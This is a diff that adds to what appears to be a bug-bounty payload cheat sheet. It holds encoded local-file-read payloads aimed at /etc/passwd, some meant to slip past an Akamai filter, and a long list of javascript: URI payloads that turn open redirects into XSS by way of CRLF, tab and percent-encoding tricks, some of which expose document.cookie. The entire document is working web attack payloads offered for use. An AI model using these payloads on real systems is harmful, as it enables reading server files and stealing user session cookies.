@@ -57,3 +57,53 @@ Local File Read/Disclosure - Akamai Bypass:
 file:///etc/x%252Fy/../passwd?/../passwd
 
 
+
+Payloads for LFR/LFD:
+---------------------
+file:/etc/passwd%3F/ 
+file:/etc%252Fpasswd/ 
+file:/etc%252Fpasswd%3F/ 
+file:///etc/%3F/../passwd 
+file:${br}/et${u}c%252Fpas${te}swd%3F/ 
+file:$(br)/et$(u)c%252Fpas$(te)swd%3F/
+:/e?c/pas?w?
+/e*c/p*w*d
+
+
+
+OPENREDIRECT TO XSS BYPASS LIST :
+--------------------------------
+javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie
+javascript://anything%0D%0A%0D%0Awindow.alert(document.cookie) javascript://www.whitelisteddomain.tld?%a0alert%281%29
+javascript://%250Alert(document.location=document.cookie)
+javascript://https://whitelisted.com/?z=%0Aalert(1)
+j%0d%0aava%0d%0aas%0d%0acrip%0d%0at%0d%0a:confirm`0`
+//j%5c%5cjavascript%3aalert(document.domain)
+javascript://whitelisted.com//%0d%0aalert(1);//
+javascript://whitelisted.com?%a0alert%281%29
+/x:1/:///%01javascript:alert(document.cookie)/
+%09Jav%09ascript:alert(document.domain)
+javascript://sub.domain.com/%0Aalert(1)
+javascript://%250Aalert(1)//?1\
+javascript://%250A1?alert(1):0
+java%0d%0ascript%0d%0a:alert(0)
+java%0d%0ascript%0d%0a:alert(0)
+java%07script:prompt`0`
+java%09scrip%07t: prompt`0`
+javascript:confirm(1)
+javascript:prompt (1)
+javascript://%250Aalert(1)
+/%09/javascript:alert(1);
+/%09/javascript:alert(1)
+//%5cjavascript:alert(1);
+//%5cjavascript:alert(1)
+/%5cjavascript:alert(1);
+/%5cjavascript:alert(1)
+javascript://%0aalert(1)
+
+
+
+
+
+
+
